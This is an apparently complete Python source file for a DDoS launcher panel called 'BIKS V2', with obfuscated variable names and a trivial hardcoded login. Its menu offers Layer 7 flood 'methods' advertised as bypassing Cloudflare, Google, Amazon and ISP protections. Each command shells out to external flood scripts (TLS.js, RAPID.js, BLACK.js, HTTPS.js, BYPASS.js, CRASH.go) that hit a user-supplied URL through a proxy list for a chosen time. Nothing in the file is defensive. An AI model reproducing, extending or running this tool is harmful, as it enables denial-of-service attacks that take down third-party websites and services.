import socket #line:1
import os #line:2
import requests #line:3
import random #line:4
import getpass #line:5
import time #line:6
import sys #line:7
from pystyle import Colors ,Colorate #line:8
def clear ():#line:11
    os .system ('cls'if os .name =='nt'else 'clear')#line:12
proxys =open ('proxy.txt').readlines ()#line:14
bots =len (proxys )#line:15
bots_str =str (bots )#line:16
def si ():#line:18
    print (Colorate .Diagonal (Colors .red_to_white ,"WELCOME TO BIKS | USER: ROOT | PLAN :: VVIP | Proxy: "+bots_str +" | HAPPY TO USE"))#line:19
    print ("")#line:20
def layer7 ():#line:22
    clear ()#line:23
    si ()#line:24
    print (Colorate .Horizontal (Colors .red_to_white ,''' 
__________.___ ____  __.  _________ 
\______   \   |    |/ _| /   _____/ 
 |    |  _/   |      <   \_____  \  
 |    |   \   |    |  \  /        \ 
 |______  /___|____|__ \/_______  / 
        \/            \/        \/  
                LIST LAYER7 METHODS
          
            
!TLS - POWERFUL TLS METHOD BYPASS AMAZON GOOGLE CF ISP
!BYPASS - BYPASS ANY ISP WITH HIGH RPS SEND
!HTTPS - SEND ATTACK WITH HTTPS-FLOOD
!RAPID - SEND HIGH RPS FOR HTTP DDOS 
!BLACK - FUCKING WEBSITE UNTIL DOWN
!CRASH - LOW QUALITY WEBSITE ATTACK


HOW TO USE
TLS https://example.com 120         TLS URL TIME
'''))#line:45
def menu ():#line:47
    clear ()#line:48
    print (Colorate .Diagonal (Colors .red_to_white ,"WELCOME TO BIKS V2 | USER: ROOT| PLAN :: VVIP | Proxy: "+bots_str +" | HAPPY TO USE"))#line:50
    print ("")#line:51
    OO0OO000O0OOO0OOO ='''
__________.___ ____  __.  _________ 
\______   \   |    |/ _| /   _____/ 
 |    |  _/   |      <   \_____  \  
 |    |   \   |    |  \  /        \ 
 |______  /___|____|__ \/_______  / 
        \/            \/        \/  
Type Layer7 To See Layer7 Methods⠀⠀⠀⠀⠀  
'''#line:60
    print (Colorate .Diagonal (Colors .red_to_white ,OO0OO000O0OOO0OOO ))#line:61
def main ():#line:62
    menu ()#line:63
    while (True ):#line:64
        OOO0OO0O0O0OOOOOO =input (Colorate .Diagonal (Colors .red_to_white ,"root@biks#~"))#line:65
        if OOO0OO0O0O0OOOOOO =="layer7"or OOO0OO0O0O0OOOOOO =="LAYER7"or OOO0OO0O0O0OOOOOO =="L7"or OOO0OO0O0O0OOOOOO =="l7":#line:66
            layer7 ()#line:67
        elif OOO0OO0O0O0OOOOOO =="clear"or OOO0OO0O0O0OOOOOO =="CLEAR"or OOO0OO0O0O0OOOOOO =="CLS"or OOO0OO0O0O0OOOOOO =="cls":#line:68
            main ()#line:69
        elif OOO0OO0O0O0OOOOOO =="ports"or OOO0OO0O0O0OOOOOO =="port"or OOO0OO0O0O0OOOOOO =="PORTS"or OOO0OO0O0O0OOOOOO =="PORT":#line:70
            ports ()#line:71
        elif "TLS"in OOO0OO0O0O0OOOOOO :#line:73
            try :#line:74
                OOOOO0OO00000O0O0 =OOO0OO0O0O0OOOOOO .split ()[1 ]#line:75
                OO000000O00OO00OO =OOO0OO0O0O0OOOOOO .split ()[2 ]#line:76
                print ("Attacking "+OOOOO0OO00000O0O0 +" For "+OO000000O00OO00OO +" ")#line:77
                os .system (f'node TLS.js {OOOOO0OO00000O0O0} {OO000000O00OO00OO} 100 10 proxy.txt')#line:78
            except IndexError :#line:79
                print ('Usage: METHOD URL TIME');#line:80
                print ('Example: METHOD URL TIME');#line:81
        elif "RAPID"in OOO0OO0O0O0OOOOOO :#line:83
            try :#line:84
                OOOOO0OO00000O0O0 =OOO0OO0O0O0OOOOOO .split ()[1 ]#line:85
                OO000000O00OO00OO =OOO0OO0O0O0OOOOOO .split ()[2 ]#line:86
                print ("Attacking "+OOOOO0OO00000O0O0 +" For "+OO000000O00OO00OO +" ")#line:87
                os .system (f'node RAPID.js {OOOOO0OO00000O0O0} {OO000000O00OO00OO} 100 10 proxy.txt')#line:88
            except IndexError :#line:89
                print ('Usage: METHOD URL TIME');#line:90
                print ('Example: METHOD URL TIME');#line:91
        elif "BLACK"in OOO0OO0O0O0OOOOOO :#line:93
            try :#line:94
                OOOOO0OO00000O0O0 =OOO0OO0O0O0OOOOOO .split ()[1 ]#line:95
                OO000000O00OO00OO =OOO0OO0O0O0OOOOOO .split ()[2 ]#line:96
                print ("Attacking "+OOOOO0OO00000O0O0 +" For "+OO000000O00OO00OO +" ")#line:97
                os .system (f'node BLACK.js {OOOOO0OO00000O0O0} {OO000000O00OO00OO} 100 10')#line:98
            except IndexError :#line:99
                print ('Usage: METHOD URL TIME');#line:100
                print ('Example: METHOD URL TIME');#line:101
        elif "CRASH"in OOO0OO0O0O0OOOOOO :#line:103
            try :#line:104
                OOOOO0OO00000O0O0 =OOO0OO0O0O0OOOOOO .split ()[1 ]#line:105
                OO000000O00OO00OO =OOO0OO0O0O0OOOOOO .split ()[2 ]#line:106
                print ("Attacking "+OOOOO0OO00000O0O0 +" For "+OO000000O00OO00OO +" ")#line:107
                os .system (f'go run CRASH.go {OOOOO0OO00000O0O0} 9999 get {OO000000O00OO00OO} nil')#line:108
            except IndexError :#line:110
                print ('Usage: METHOD URL TIME');#line:111
                print ('Example: METHOD URL TIME');#line:112
        elif "HTTPS"in OOO0OO0O0O0OOOOOO :#line:114
            try :#line:115
                OOOOO0OO00000O0O0 =OOO0OO0O0O0OOOOOO .split ()[1 ]#line:116
                OO000000O00OO00OO =OOO0OO0O0O0OOOOOO .split ()[2 ]#line:117
                print ("Attacking "+OOOOO0OO00000O0O0 +" For "+OO000000O00OO00OO +" ")#line:118
                os .system (f'node HTTPS.js {OOOOO0OO00000O0O0} {OO000000O00OO00OO} 100 10 proxy.tx')#line:119
            except IndexError :#line:120
                print ('Usage: METHOD URL TIME');#line:121
                print ('Example: METHOD URL TIME');#line:122
        elif "BYPASS"in OOO0OO0O0O0OOOOOO :#line:124
            try :#line:125
                OOOOO0OO00000O0O0 =OOO0OO0O0O0OOOOOO .split ()[1 ]#line:126
                OO000000O00OO00OO =OOO0OO0O0O0OOOOOO .split ()[2 ]#line:127
                print ("Attacking "+OOOOO0OO00000O0O0 +" For "+OO000000O00OO00OO +" ")#line:128
                os .system (f'node BYPASS.js {OOOOO0OO00000O0O0} {OO000000O00OO00OO} 100 10 proxy.txt')#line:129
            except IndexError :#line:130
                print ('Usage: METHOD URL TIME');#line:131
                print ('Example: METHOD URL TIME');#line:132
        elif "help"in OOO0OO0O0O0OOOOOO :#line:134
            print (Colorate .Horizontal (Colors .red_to_white ,''' 
LAYER7 - SEE ALL LAYER7 METHOD
HELP - FOR HELP
CLEAR - CLEAR TERMINAL
'''))#line:139
        else :#line:140
            try :#line:141
                OO00OOO0OOOO00OO0 =OOO0OO0O0O0OOOOOO .split ()[0 ]#line:142
                print ("Command: [ "+OO00OOO0OOOO00OO0 +" ] Not Found!")#line:143
            except IndexError :#line:144
                pass #line:145
def login ():#line:148
    clear ()#line:149
    OOOOO0OO000OO0OO0 ="a"#line:150
    OO0O00OO0OO000OO0 ="a"#line:151
    OO0O0O0000O0O0OOO =input ("</> Username: ")#line:152
    O0OOO0O00OOO00000 =getpass .getpass (prompt ='</> Password: ')#line:153
    if OO0O0O0000O0O0OOO !=OOOOO0OO000OO0OO0 or O0OOO0O00OOO00000 !=OO0O00OO0OO000OO0 :#line:154
        print ("")#line:155
        print ("Password/Username xd??")#line:156
        sys .exit (1 )#line:157
    elif OO0O0O0000O0O0OOO ==OOOOO0OO000OO0OO0 and O0OOO0O00OOO00000 ==OO0O00OO0OO000OO0 :#line:158
        print ("WELCOME TO BIKS V2")#line:159
        time .sleep (0.3 )#line:160
        main ()#line:161
login ()